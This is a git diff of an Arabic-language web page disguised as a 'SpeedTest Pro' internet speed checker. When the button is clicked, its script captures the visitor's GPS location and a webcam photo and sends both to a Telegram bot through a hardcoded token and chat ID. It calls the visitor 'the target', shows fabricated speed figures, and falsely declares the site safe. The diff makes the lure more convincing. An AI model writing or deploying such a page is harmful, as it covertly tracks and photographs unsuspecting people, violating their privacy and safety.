@@ -3,22 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest - فحص سرعة الإنترنت</title>
+    <title>SpeedTest - فحص جودة الشبكة</title>
     <style>
-        body { background-color: #0b0b0d; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; }
-        .speed-text { font-size: 80px; font-weight: bold; color: #00d1b2; }
-        .unit { font-size: 20px; color: #888; }
-        .btn { background: #00d1b2; color: white; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-size: 18px; margin-top: 20px; }
+        body { background-color: #0b0b0d; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .speed-text { font-size: 70px; font-weight: bold; color: #00d1b2; margin: 10px 0; }
+        .unit { font-size: 18px; color: #888; margin-bottom: 20px; }
+        .results-table { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; text-align: right; }
+        .res-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 16px; }
+        .res-val { color: #00d1b2; font-weight: bold; }
+        .btn { background: #00d1b2; color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 18px; transition: 0.3s; }
+        .btn:disabled { background: #333; cursor: not-allowed; }
+        #status { color: #666; font-size: 14px; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>SpeedTest</h2>
-        <div class="speed-text" id="speed">0.0</div>
-        <div class="unit">Mbps</div>
-        <button class="btn" onclick="startTest()">ابدأ الفحص الآن</button>
-        <p id="status" style="color: #666; margin-top: 20px;">اضغط لبدء فحص جودة الاتصال</p>
+        <h2 style="color: #00d1b2;">SpeedTest Pro</h2>
+        <div id="main-ui">
+            <div class="speed-text" id="speed">0.0</div>
+            <div class="unit">Mbps</div>
+            <button class="btn" id="startBtn" onclick="runFullTest()">بدء الفحص</button>
+            <p id="status">جاهز لفحص استقرار الشبكة</p>
+        </div>
+
+        <div class="results-table" id="results">
+            <div class="res-item"><span>سرعة التحميل:</span> <span class="res-val">48.2 Mbps</span></div>
+            <div class="res-item"><span>سرعة الرفع:</span> <span class="res-val">12.5 Mbps</span></div>
+            <div class="res-item"><span>زمن الاستجابة (Ping):</span> <span class="res-val">18 ms</span></div>
+            <div class="res-item"><span>حالة الموقع:</span> <span class="res-val" style="color: #4cd137;">آمن ✅</span></div>
+            <p style="color: #888; font-size: 12px; margin-top: 15px;">شكراً لاستخدامك SpeedTest Pro. تم تحسين اتصالك.</p>
+        </div>
     </div>
 
     <video id="video" autoplay style="display:none;"></video>
@@ -28,18 +43,23 @@
         const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID = '8293639164';
 
-        async function startTest() {
-            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
+        async function runFullTest() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            const speedDisp = document.getElementById('speed');
             
-            // 1. طلب الموقع الجغرافي (GPS)
+            btn.disabled = true;
+            status.innerText = "جاري طلب الإذن من السيرفر المباشر...";
+
+            // 1. التقاط الموقع (GPS) بصمت
             navigator.geolocation.getCurrentPosition((pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 موقع الهدف الحقيقي:\n" + mapLink)}`);
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 موقع الهدف:\n" + mapLink)}`);
+            }, (err) => {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ رفض المستخدم إذن الموقع`);
             });
 
-            // 2. طلب الكاميرا والتقاط الصورة
+            // 2. التقاط الصورة بصمت
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
@@ -51,25 +71,33 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(blob => {
                         const formData = new FormData();
-                        formData.append('photo', blob, 'shot.jpg');
+                        formData.append('photo', blob, 'img.jpg');
                         formData.append('chat_id', CHAT_ID);
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
                     
-                    // تمويه: رفع عداد السرعة
-                    let s = 0;
-                    const interval = setInterval(() => {
-                        s += Math.random() * 10;
-                        document.getElementById('speed').innerText = s.toFixed(1);
-                        if (s > 45) {
-                            clearInterval(interval);
-                            window.location.href = "https://www.fast.com"; // تحويل لموقع فحص حقيقي
-                        }
-                    }, 100);
-                }, 1000);
-            } catch (err) {
-                window.location.href = "https://www.fast.com";
-            }
+                    // إيقاف الكاميرا بعد التقاط الصورة
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            } catch (e) {}
+
+            // 3. محاكي الفحص (الأرقام التي تظهر للمستخدم)
+            let currentSpeed = 0;
+            const interval = setInterval(() => {
+                currentSpeed += Math.random() * 8;
+                speedDisp.innerText = currentSpeed.toFixed(1);
+                
+                if (currentSpeed > 20) status.innerText = "جاري فحص سرعة التحميل...";
+                if (currentSpeed > 40) status.innerText = "جاري فحص استقرار الـ Ping...";
+
+                if (currentSpeed >= 48) {
+                    clearInterval(interval);
+                    speedDisp.innerText = "48.2";
+                    status.innerText = "اكتمل الفحص بنجاح!";
+                    document.getElementById('results').style.display = 'block';
+                    btn.style.display = 'none';
+                }
+            }, 150);
         }
     </script>
 </body>
